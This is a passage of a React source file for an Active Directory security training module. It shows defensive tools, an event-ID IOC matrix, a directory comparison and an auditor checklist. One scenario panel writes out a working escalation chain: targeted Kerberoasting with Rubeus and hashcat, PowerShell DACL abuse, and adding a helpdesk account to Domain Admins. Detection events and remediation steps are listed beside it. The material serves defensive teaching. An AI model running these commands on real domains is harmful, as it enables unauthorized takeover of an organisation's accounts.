                ["PingCastle", "PingCastle.exe --healthcheck", "Automated AD security assessment. Scores AD health: delegation, stale accounts, privileged groups, trust config, SPNs, DC exposure. Generates HTML report. Run monthly.", C.green],
                ["ADExplorer (Sysinternals)", "ADExplorer.exe", "LDAP browser for AD. Snapshot mode creates offline baseline of all objects for comparison. Diff two snapshots to detect changes.", C.purple],
                ["Purple Knight / Forest Druid", "forest-druid", "AD attack surface enumeration. Identifies Tier 0 assets, shortest paths to them, and misconfigurations. Complementary to BloodHound.", C.orange],
                ["ADSI Edit / LDP.exe", "adsiedit.msc", "Raw LDAP editor. View and modify any attribute, ACL, or object. Use for manual ACL review and remediation. LDP.exe for LDAP trace.", C.teal],
                ["Microsoft ATA / Defender for Identity", "Cloud/on-prem", "Microsoft's AD threat detection. Detects: PtH, PtT, Golden Ticket, DCSync, Skeleton Key, brute force, recon, lateral movement. Baseline-based behavioral detection.", C.sky],
              ].map(([t, cmd, d, c]) => (
                <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "10px" }}>
                  <div style={{ color: c, fontWeight: "700", fontSize: "11px" }}>{t}</div>
                  <div style={{ color: C.dim, fontSize: "10px", fontStyle: "italic", marginBottom: "4px" }}>{cmd}</div>
                  <div style={{ color: C.text, fontSize: "11px" }}>{d}</div>
                </div>
              ))}
            </div>
          )}

          {monTab === "iocs" && (
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ AD ATTACK IOC MATRIX</div>
              <div style={S.grid2}>
                {[
                  ["Event 4662 from non-DC — replication rights", "DCSync attack. Only DC computer accounts should generate replication-related 4662 events. CRITICAL ALERT.", C.red],
                  ["Event 5136 on AdminSDHolder object", "ACL backdoor being planted. SDProp will propagate to all privileged groups within 60 minutes. CRITICAL.", C.red],
                  ["New computer account created by user account", "RBCD or Shadow Credentials attack setup. MachineAccountQuota abuse. 5137 + creator not in delegation group.", C.orange],
                  ["msDS-AllowedToActOnBehalfOfOtherIdentity modified", "RBCD attack. Event 5136 on computer object with this attribute change. Enables S4U2Proxy impersonation.", C.red],
                  ["msDS-KeyCredentialLink modified", "Shadow Credentials attack. Event 5136. Attacker planting fake Windows Hello key for persistent account access.", C.red],
                  ["Domain policy changed (Event 4739)", "Password/lockout policy modification. May indicate attacker weakening lockout to enable brute force.", C.orange],
                  ["Kerberos policy lifetime extended (Event 4713)", "Attacker extending Kerberos ticket lifetime to keep Golden Ticket valid longer. CRITICAL if on DC.", C.red],
                  ["GPO SYSVOL file modification (Sysmon 11)", "GPO abuse for code execution. Any .pol file or scripts folder write in SYSVOL without change ticket.", C.orange],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
                    <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </PB>

        {/* ── 10: AD vs LDAP comparison ── */}
        <PB title="ACTIVE DIRECTORY vs LDAP / OpenLDAP / Azure AD — COMPARISON" icon="🐧" color={C.cyan}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["directory","auth","security","enterprise"].map(t => (
              <button key={t} style={S.tab(cmpTab === t, C.cyan)} onClick={() => setCmpTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "14px" }}>
            {[
              { title: "AD DS (On-Prem)", color: C.indigo, kv: {
                directory: [["Protocol","LDAP v3 + MS extensions"],["Database","ntds.dit (ESE)"],["Schema","Extensible, AD-specific"],["Replication","Multi-master DRS/USN"],["Objects","Users,Computers,Groups,GPOs"],["DN format","CN=user,OU=unit,DC=corp,DC=local"]],
                auth: [["Primary","Kerberos v5"],["Fallback","NTLM (NTLMv2)"],["MFA","Smart Card, FIDO2 (Win Hello)"],["Federation","AD FS (SAML/WS-Fed/OAuth)"],["DC role","KDC + Auth + Directory"]],
                security: [["Access control","Per-object DACL (rich ACEs)"],["Audit","Event 5136/4662 per object"],["Patch surface","DC Windows + AD DS role"],["Privilege model","Domain Admins / Enterprise Admins"],["Attack tool","BloodHound, mimikatz, Impacket"]],
                enterprise: [["Scale","Tested to 1B+ objects"],["Management","GPO, PowerShell, ADUC"],["Integration","Kerberos SSO across on-prem"],["Cloud","Azure AD Connect sync"],["Cost","Windows Server licensing"]],
              }},
              { title: "OpenLDAP / FreeIPA (Linux)", color: C.green, kv: {
                directory: [["Protocol","LDAP v3 (standard)"],["Database","Berkeley DB / LMDB / MDB"],["Schema","RFC-based + extensions"],["Replication","Provider-Consumer (syncrepl)"],["Objects","posixAccount, posixGroup, etc."],["DN format","uid=user,ou=unit,dc=corp,dc=local"]],
                auth: [["Primary","Kerberos (MIT krb5) / LDAP bind"],["Fallback","LDAP simple bind (plaintext risk)"],["MFA","TOTP via OTP / RADIUS"],["Federation","Shibboleth, mod_auth_kerb"],["DC role","KDC (separate) + LDAP (separate)"]],
                security: [["Access control","LDAP ACIs (simpler than AD DACLs)"],["Audit","slapd access log overlay"],["Patch surface","OpenLDAP package + OS"],["Privilege model","cn=admin or posixGroup-based"],["Attack tool","ldapsearch, ldap3 library"]],
                enterprise: [["Scale","Millions of objects (practical)"],["Management","ldapmodify, web UI (FreeIPA)"],["Integration","PAM/SSSD for Linux auth"],["Cloud","No native cloud sync"],["Cost","Open source (no license)"]],
              }},
              { title: "Azure AD / Entra ID", color: C.sky, kv: {
                directory: [["Protocol","HTTPS/REST (MS Graph API)"],["Database","Cloud (Microsoft managed)"],["Schema","Fixed + directory extensions"],["Replication","Microsoft global infra"],["Objects","Users, Groups, Apps, Devices"],["ID","UPN (user@tenant.onmicrosoft.com)"]],
                auth: [["Primary","OIDC / OAuth 2.0 / SAML"],["MFA","Azure MFA, FIDO2, Authenticator"],["Legacy","NTLM/Kerberos via AD DS only"],["Federation","Azure AD B2B/B2C, SAML IdP"],["SSO","Seamless SSO for hybrid"]],
                security: [["Access control","RBAC roles (Entra) + Conditional Access"],["Audit","Sign-in logs, Audit logs (Log Analytics)"],["Patch surface","Microsoft managed (no patching)"],["Privilege model","Global Admin / PIM (JIT)"],["Attack tool","MicroBurst, ROADtools, AADInternals"]],
                enterprise: [["Scale","100M+ users (Microsoft 365)"],["Management","Entra Admin Center, PowerShell"],["Integration","M365, Azure, SaaS via SSO"],["Cloud","Native cloud directory"],["Cost","AAD P1/P2 licensing"]],
              }},
            ].map(({ title, color, kv }) => (
              <div key={title} style={{ background: "#0a0a10", border: `1px solid ${color}33`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color, fontWeight: "700", fontSize: "12px", marginBottom: "10px" }}>▸ {title}</div>
                {(kv[cmpTab] || []).map(([k, v]) => (
                  <div key={k} style={{ display: "flex", gap: "8px", marginBottom: "5px" }}>
                    <span style={{ color: C.dim, minWidth: "90px", fontSize: "10.5px" }}>{k}</span>
                    <span style={{ color: C.bright, fontSize: "10.5px" }}>{v}</span>
                  </div>
                ))}
              </div>
            ))}
          </div>
        </PB>

        {/* ── 11: Enterprise Scenario ── */}
        <PB title="ENTERPRISE SCENARIO — FULL AD COMPROMISE VIA ACL ABUSE" icon="⚠" color={C.orange} accent={C.orange + "44"}>
          <div style={{ color: C.red, fontWeight: "700", marginBottom: "12px", fontSize: "12px" }}>
            🔥 SCENARIO: Attacker Escalates from Helpdesk Account to Domain Admin in 4 Hours via BloodHound Attack Path
          </div>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ ATTACK CHAIN (BLOODHOUND-IDENTIFIED PATH)</div>
              <div style={S.code}>
{`# Starting point: helpdesk account (hd_alice)`}
{`# BloodHound shortest path to Domain Admin:`}
{``}
{`Step 1: hd_alice has GenericWrite on svc_backup`}
{`# Set targeted Kerberoast SPN → extract ticket`}
{`Set-ADUser svc_backup -ServicePrincipalNames`}
{`    @{Add="attacker/fake"}  ; writable because GenericWrite`}
{`Rubeus.exe kerberoast /user:svc_backup  ; 16-char weak pw`}
{`hashcat → cracked: "Backup2023!"`}
{``}
{`Step 2: svc_backup has WriteDACL on IT-Admins group`}
{`# Modify group DACL to grant hd_alice GenericAll`}
{`$acl = Get-ACL "AD:\\CN=IT-Admins,..."`}
{`$ace = New-Object System.DirectoryServices.`}
{`    ActiveDirectoryAccessRule(`}
{`    [System.Security.Principal.SecurityIdentifier]"S-1-5-21-...-hd_alice_RID",`}
{`    "GenericAll","Allow")`}
{`$acl.AddAccessRule($ace); Set-ACL ...`}
{``}
{`Step 3: IT-Admins has GenericAll on Domain Admins`}
{`Add-ADGroupMember "IT-Admins" -Members hd_alice`}
{`Add-ADGroupMember "Domain Admins" -Members hd_alice`}
{``}
{`Step 4: DC access achieved`}
{`Enter-PSSession DC01 -Credential CORP\\hd_alice`}
{`# Game over → DCSync, dump ntds.dit, plant persistence`}
              </div>
            </div>
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ DETECTION + PREVENTION</div>
              <div style={S.code}>
{`# Step 1 would have been caught by:`}
{`# Event 5136: SPN added to svc_backup by hd_alice`}
{`# Alert: non-admin modifying ServicePrincipalName`}
{``}
{`# Step 2 would have been caught by:`}
{`# Event 4670: DACL modified on IT-Admins group`}
{`# Alert: group ACL change from non-admin account`}
{``}
{`# Step 3 would have been caught by:`}
{`# Event 4756: member added to IT-Admins`}
{`# Event 4756: member added to Domain Admins`}
{`# CRITICAL: Domain Admins membership change`}
{``}
{`# Prevention — BloodHound remediation:`}
{`# 1. Remove hd_alice GenericWrite on svc_backup`}
{`#    (or remove svc_backup WriteDACL on IT-Admins)`}
{`#    Breaking ONE edge breaks the entire path`}
{``}
{`# 2. Set strong random password on svc_backup:`}
{`Set-ADAccountPassword svc_backup`}
{`    -Reset -NewPassword (ConvertTo-SecureString`}
{`    ([System.Web.Security.Membership]::GeneratePassword(64,8))`}
{`    -AsPlainText -Force)`}
{``}
{`# 3. Convert svc_backup to gMSA:`}
{`New-ADServiceAccount -Name svc_backup_gmsa `}
{`    -DNSHostName corp.local`}
{`# gMSA = 240-char auto-rotating = unroastable`}
              </div>
            </div>
          </div>
          <hr style={S.sep} />
          <div style={S.grid3}>
            {[
              ["Root Cause", "Excessive ACL grants accumulated over years. No regular ACL review. BloodHound ran by attacker before defenders. GenericWrite + WriteDACL chain created 4-hop path to DA.", C.orange],
              ["Key Lesson", "Breaking a SINGLE edge in a BloodHound attack path defeats the entire chain. Regular BloodHound analysis from DEFENDER perspective identifies and removes these paths before attackers exploit them.", C.cyan],
              ["Remediation", "Run BloodHound as blue team monthly. Remove all non-admin GenericAll/WriteDACL/WriteOwner ACEs. Deploy PingCastle for scoring. Implement tiering model. Enable all AD audit events.", C.green],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#09090d", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
        </PB>

        {/* ── 12: Checklist + Summary ── */}
        <PB title="AUDITOR CHECKLIST + SUMMARY" icon="✓" color={C.green}>
          <div style={S.grid2}>
            {[
              [C.red, "Tier 0 — DC Hardening (Critical)", [
                "DCs have minimum software installed — no additional roles (IIS, SQL, RDP)",
                "DC admin accounts NOT used for any non-DC task (Tier 0 only)",
                "DCs on separate VLAN with firewall — only DC ports (88, 135, 389, 445, 636, 3268) allowed",
                "Enable Windows Defender / MDE on all DCs with real-time protection",
                "ntds.dit backup access restricted — backup system on separate Tier 0 network",
              ]],
              [C.orange, "AD Object & ACL Security", [
                "Run BloodHound monthly — review all paths to Domain Admins and Enterprise Admins",
                "AdminSDHolder ACL baselined — weekly diff against known-good snapshot",
                "No non-admin accounts with GenericAll/WriteDACL/WriteOwner on privileged objects",
                "MachineAccountQuota = 0 (prevent RBCD attack setup by regular users)",
                "Unconstrained delegation removed from all non-DC accounts (TrustedForDelegation=False)",
                "msDS-AllowedToActOnBehalfOfOtherIdentity baseline — alert on any change",
              ]],
              [C.cyan, "Authentication & Account Policy", [
                "Domain Admins in Protected Users Security Group (no NTLM, no RC4, no delegation)",
                "All service accounts converted to gMSA (auto-rotating 240-char password)",
                "Stale account cleanup: disable accounts inactive >60 days, delete >90 days",
                "Password never expires = false for all user accounts (service accounts use gMSA)",
                "Fine-grained password policy: 20+ chars for admin/service accounts",
              ]],
              [C.purple, "Monitoring & Detection Coverage", [
                "Event 4662 (DCSync) alerting — non-DC source = CRITICAL",
                "Event 5136 on AdminSDHolder and Domain Admins objects — CRITICAL alert",
                "Event 4756 (group membership change) for all privileged groups → SIEM",
                "SYSVOL Sysmon Event 11 monitoring — GPO file modification alert",
                "AD Recycle Bin enabled (Enable-ADOptionalFeature 'Recycle Bin Feature')",
                "PingCastle score tracked monthly — regression = investigation",
              ]],
            ].map(([c, title, items]) => (
              <div key={title} style={{ background: "#09090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "8px" }}>▸ {title}</div>
                {items.map(item => (
                  <div key={item} style={{ display: "flex", gap: "6px", marginBottom: "5px" }}>
                    <span style={{ color: C.dim, fontSize: "11px" }}>☐</span>
                    <span style={{ color: C.dim, fontSize: "11px" }}>{item}</span>
                  </div>
                ))}
              </div>
            ))}
          </div>
          <hr style={S.sep} />
          <div style={S.grid3}>
            {[
              ["AD ACLs = the real attack surface", "Every AD object has a DACL. Misconfigured ACLs create privilege escalation paths that bypass all authentication hardening. BloodHound from the blue team's perspective is the single most impactful AD security action.", C.red],
              ["ntds.dit = domain in a file", "All hashes, all object data, all group membership. VSS + robocopy or DCSync extracts everything. Protect with: DC VLAN isolation, monitor replication events, LAPS on DCs, no DA on workstations.", C.orange],
              ["Tiering breaks lateral movement", "The Tiered Administration Model is the most effective single control against lateral movement in AD environments. If implemented correctly, workstation compromise cannot lead to DC compromise regardless of vulnerabilities.", C.green],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#09090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "5px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
          <hr style={S.sep} />
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
            <div style={{ color: C.dim, fontSize: "11px" }}>
              <span style={{ color: C.green }}>NEXT MODULE →</span> Step 09: Windows Networking — TCP/IP Stack, SMB, RPC, WinRM, DNS, Firewall & Network Attack Techniques
            </div>
            <div style={{ display: "flex", gap: "8px" }}>
              <Pill c={C.green}>Step 08 Complete</Pill>
              <Pill c={C.indigo}>12 Panels · Active Directory Mastered</Pill>
            </div>
          </div>
        </PB>

      </div>
    </div>
  );
}
